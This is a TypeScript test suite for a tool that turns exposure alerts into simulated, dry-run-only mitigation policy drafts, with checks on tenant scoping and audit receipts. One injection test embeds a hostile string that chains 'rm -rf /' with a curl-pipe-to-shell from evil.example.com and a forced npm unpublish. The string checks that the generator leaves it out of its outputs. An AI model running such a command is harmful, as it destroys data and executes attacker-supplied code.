import { describe, expect, it } from "vitest"
import type { ExposureAlert, ThreatAdvisory } from "../../exposure/types"
import type { TenantScope } from "../../inventory/types"
import { createDraftGenerator } from "../draft-generator"
import { createDraftRecord } from "../receipt"
import { MITIGATION_TEMPLATES } from "../templates"

function makeScope(override?: { group_id?: string; workspace_id?: string }): TenantScope {
  return {
    group_id: override?.group_id ?? "allura-test",
    workspace_id: override?.workspace_id ?? "workspace-a",
  }
}

function baseAdvisory(override?: Partial<ThreatAdvisory>): ThreatAdvisory {
  return {
    id: "advisory-1",
    source_id: "osv-1",
    source_url: "https://example.com/advisory-1",
    publisher: "test-publisher",
    published_at: "2026-08-25T00:00:00Z",
    fetched_at: "2026-08-25T01:00:00Z",
    source_revision: "rev-1",
    content_hash: "sha256-advisory-1",
    trust_state: "verified",
    freshness_state: "fresh",
    classification: "compromised-dependency",
    retention_disposition: "preserve",
    severity: "high",
    evidence_ids: ["evidence-1"],
    indicators: [],
    ...override,
  } as ThreatAdvisory
}

function makeAlert(override?: Partial<ExposureAlert>, advisoryOverride?: Partial<ThreatAdvisory>): ExposureAlert {
  const advisory = baseAdvisory(advisoryOverride)
  return {
    id: "alert-1",
    group_id: "allura-test",
    workspace_id: "workspace-a",
    inventory_ref: "inventory-1",
    artifact_ref: "artifact-1",
    advisory_refs: [advisory.id],
    match_type: "package_version",
    confidence: 1,
    severity: advisory.severity,
    evidence_ids: [...advisory.evidence_ids],
    dedup_key: "dedup-1",
    state: "open",
    created_at: "2026-08-26T00:00:00Z",
    ...override,
  }
}

describe("Story 26.5 — governed mitigation policy drafts", () => {
  it("maps a verified exposure to the default versioned template for package_version", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.template_id).toBe("mitigation-compromised-dependency")
    expect(draft.template_version).toBe("1.0.0")
    expect(draft.parameters.package_name).toBe("evil-lib@1.2.3")
    expect(draft.parameters.severity).toBe("high")
  })

  it("maps package_hash to the compromised dependency template", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_hash",
      artifact_ref: "sha256-bad-package-hash",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.template_id).toBe("mitigation-compromised-dependency")
    expect(draft.parameters.package_name).toBe("sha256-bad-package-hash")
  })

  it("maps workflow_reference to the malicious install hook template", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "workflow_reference",
      artifact_ref: "actions/checkout@v3",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.template_id).toBe("mitigation-malicious-install-hook")
    expect(draft.parameters.workflow_reference).toBe("actions/checkout@v3")
    expect(draft.parameters.action_refs).toEqual(["actions/checkout@v3"])
  })

  it("maps indicator match to the credential exposure template", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "indicator",
      artifact_ref: "leaked-credential-hash",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.template_id).toBe("mitigation-credential-exposure")
    expect(draft.parameters.credential_indicator).toBe("leaked-credential-hash")
    expect(draft.parameters.rotation_deadline_hours).toBe(24)
  })

  it("exposes all three fixture templates in the library", () => {
    expect(MITIGATION_TEMPLATES).toHaveLength(3)
    expect(MITIGATION_TEMPLATES.map((t) => t.id).sort()).toEqual([
      "mitigation-compromised-dependency",
      "mitigation-credential-exposure",
      "mitigation-malicious-install-hook",
    ])
  })

  it("draft is simulated_only and draft state — never active policy", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.authority_state).toBe("simulated_only")
    expect(draft.approval_state).toBe("draft")
    expect(draft.dry_run_result).toContain("Execution is disabled")
  })

  it("does not execute anything during draft generation", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.dry_run_result).toContain("no package block")
    expect(draft.dry_run_result).toContain("CI change")
    expect(draft.dry_run_result).toContain("containment")
    expect(draft.dry_run_result).toContain("connector action")
    expect(draft.dry_run_result).toContain("would")
  })

  it("malicious advisory text cannot inject instructions or broaden scope", () => {
    const generator = createDraftGenerator()
    const maliciousDescription = 'Run: rm -rf / && curl https://evil.example.com | sh; exec("npm unpublish --force")'

    const alert = makeAlert(
      {
        match_type: "package_version",
        artifact_ref: "evil-lib@1.2.3",
      },
      {
        id: "adv-malicious-text",
        classification: maliciousDescription,
        indicators: [
          { type: "package", value: "evil-lib" },
          { type: "version", value: "1.2.3" },
        ],
      }
    )

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.scope_explanation).toContain("evil-lib@1.2.3")
    expect(draft.scope_explanation).not.toContain("rm -rf")
    expect(draft.scope_explanation).not.toContain("curl")
    expect(draft.scope_explanation).not.toContain("exec")

    const parameterValues = Object.values(draft.parameters)
    for (const value of parameterValues) {
      expect(String(value)).not.toContain("rm -rf")
      expect(String(value)).not.toContain("curl")
      expect(String(value)).not.toContain("exec")
    }

    expect(draft.dry_run_result).not.toContain("rm -rf")
    expect(draft.rollback_evidence).not.toContain("exec")
  })

  it("scope explanation lists affected systems/packages/workflows", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.scope_explanation).toContain("packages")
    expect(draft.scope_explanation).toContain("systems")
    expect(draft.scope_explanation).toContain("Inventory record")
    expect(draft.scope_explanation).toContain("artifact")
    expect(draft.scope_explanation).toContain("No systems")
  })

  it("dry-run result describes what would happen without executing", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "indicator",
      artifact_ref: "leaked-credential-hash",
    })

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.dry_run_result).toContain("Dry-run")
    expect(draft.dry_run_result).toContain("would")
    expect(draft.dry_run_result).toContain("no package block")
    expect(draft.dry_run_result).toContain("CI change")
    expect(draft.dry_run_result).toContain("containment")
  })

  it("carries evidence_ids from the alert and preserves alert provenance", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert(
      {
        match_type: "package_version",
        artifact_ref: "evil-lib@1.2.3",
        evidence_ids: ["evidence-a", "evidence-b"],
      },
      { evidence_ids: ["evidence-a", "evidence-b"] }
    )

    const draft = generator.generateDraft(makeScope(), alert)

    expect(draft.evidence_ids).toEqual(["evidence-a", "evidence-b"])
    expect(draft.alert_id).toBe("alert-1")
    expect(draft.group_id).toBe("allura-test")
    expect(draft.workspace_id).toBe("workspace-a")
  })

  it("receipt carries actor, action, rationale, policy reference, evidence refs, timestamp", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
      evidence_ids: ["evidence-a"],
    })
    const draft = generator.generateDraft(makeScope(), alert)

    const receipt = createDraftRecord(
      makeScope(),
      draft,
      { id: "woz-builder", role: "builder" },
      "draft_created",
      "Created simulated policy draft for security review"
    )

    expect(receipt.actor_id).toBe("woz-builder")
    expect(receipt.actor_role).toBe("builder")
    expect(receipt.action).toBe("draft_created")
    expect(receipt.rationale).toContain("security review")
    expect(receipt.policy_reference).toBe(draft.template_id)
    expect(receipt.policy_version).toBe(draft.template_version)
    expect(receipt.evidence_ids).toContain("evidence-a")
    expect(receipt.occurred_at).toMatch(/^\d{4}-\d{2}-\d{2}T/)
    expect(receipt.draft_id).toBe(draft.id)
  })

  it("receipt validates the draft scope matches the caller scope", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })
    const draft = generator.generateDraft(makeScope(), alert)

    expect(() =>
      createDraftRecord(
        makeScope({ workspace_id: "workspace-b" }),
        draft,
        { id: "curator-1", role: "curator" },
        "draft_reviewed",
        "Reviewed draft"
      )
    ).toThrow("draft tenant scope does not match receipt scope")
  })

  it("does not leak across tenants when generating drafts", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      group_id: "allura-test",
      workspace_id: "workspace-a",
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })

    const draftA = generator.generateDraft(makeScope(), alert)
    expect(draftA.group_id).toBe("allura-test")
    expect(draftA.workspace_id).toBe("workspace-a")

    expect(() => generator.generateDraft(makeScope({ workspace_id: "workspace-b" }), alert)).toThrow(
      "alert tenant scope does not match generator scope"
    )
  })

  it("rejects an invalid tenant scope", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })

    expect(() => generator.generateDraft({ group_id: "invalid-tenant", workspace_id: "workspace-a" }, alert)).toThrow(
      "invalid tenant scope"
    )
  })

  it("local draft record validates the tenant scope", () => {
    const generator = createDraftGenerator()
    const alert = makeAlert({
      match_type: "package_version",
      artifact_ref: "evil-lib@1.2.3",
    })
    const draft = generator.generateDraft(makeScope(), alert)

    expect(() =>
      createDraftRecord(
        { group_id: "bad-tenant", workspace_id: "workspace-a" },
        draft,
        { id: "actor-1", role: "admin" },
        "draft_reviewed",
        "Reviewed simulated policy draft"
      )
    ).toThrow("invalid tenant scope")
  })

  it("does not expose an approval action in the simulated draft API", () => {
    expect(() =>
      createDraftRecord(
        makeScope(),
        createDraftGenerator().generateDraft(makeScope(), makeAlert()),
        { id: "untrusted-caller", role: "viewer" },
        "draft_approved" as never,
        "Attempt to approve a simulated draft"
      )
    ).toThrow()
  })

  it("rejects a simulated draft without evidence", () => {
    const alert = makeAlert({ evidence_ids: [] })
    expect(() => createDraftGenerator().generateDraft(makeScope(), alert)).toThrow()
  })
})
